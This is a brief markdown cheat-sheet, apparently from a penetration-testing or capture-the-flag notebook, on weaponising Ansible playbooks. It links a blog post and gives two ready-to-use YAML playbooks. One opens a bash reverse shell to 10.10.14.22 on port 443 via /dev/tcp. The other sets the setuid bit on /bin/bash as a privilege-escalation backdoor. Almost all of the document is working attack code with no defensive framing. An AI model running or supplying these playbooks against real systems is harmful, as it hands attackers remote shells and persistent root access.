## exploiting playbook
https://rioasmara.com/2022/03/21/ansible-playbook-weaponization/

### rev shell
```yaml
- hosts: localhost
  tasks:
  - name: rev
    shell: bash -c 'bash -i >& /dev/tcp/10.10.14.22/443 0>&1'
```

### priv esc backdoor
```yaml
- name: "whatever"
  hosts: localhost
  connection: local
  tasks:
    - name: "whatever"
      shell: "chmod +s /bin/bash"
      register: "output"
```
